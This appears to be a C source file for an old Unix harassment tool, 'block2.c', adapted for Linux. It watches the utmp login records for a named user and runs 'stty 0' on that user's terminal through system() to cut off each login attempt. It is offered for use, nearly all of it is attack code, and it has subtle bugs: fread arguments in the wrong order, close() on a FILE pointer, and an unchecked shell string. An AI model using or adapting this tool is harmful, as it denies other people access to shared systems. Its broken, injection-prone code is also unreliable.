/* 
   block2.c -- prevent a user from logging in
   Original prg by Shooting Shark
   usage : block username [&]
   I suggest you run this in background.

   Modified for GNU/Linux)
   Shooting Shark is KING.
*/
#include <stdio.h>
#include <stdlib.h>
#include <utmp.h>
#include <ctype.h>
#include <termio.h>
#include <fcntl.h>

#define W_OK 2
#define SLEEP 1
#define UTMP "/var/run/utmp"
#define TTY_PRE "/dev/"

main(ac,av)
int ac;
char *av[];
{
  int target;
  FILE *fp;
  struct utmp user;
  struct termio *pts;
  char buf[30], buf2[50];

  if (ac != 2) {
    printf("usage : %s username\n",av[0]);
    exit(-1);
  }

  for (;;) {
    fp = fopen(UTMP,"r");
    if (fp == NULL) {
      printf("fatal error!  cannot open %s.\n",UTMP);
      exit(-1);
    }

    while (fread(fp, &user, sizeof user) > 0) {
      if (isprint(user.ut_name[0])) {
	if (!(strcmp(user.ut_name,av[1]))) {

	  printf("%s is logging in...",user.ut_name);
	  sprintf(buf,"%s%s",TTY_PRE,user.ut_line);
	  printf("%s\n",buf);
	  
	  if (access(buf,W_OK) == -1) {
	    printf("failed - program aborting.\n");
	    exit(-1);
	  }
	  else {
	    if ((target = open(buf,O_WRONLY)) != EOF) {
	      sprintf(buf2,"stty 0 > %s",buf);
	      system(buf2);
	      printf("killed.\n");
	      sleep(10);
	    }
	  } /* else */
	} /* if strcmp */
      } /* if isprint */
    } /* while */
    close(fp);
    sleep(SLEEP);
  } /* for */
}
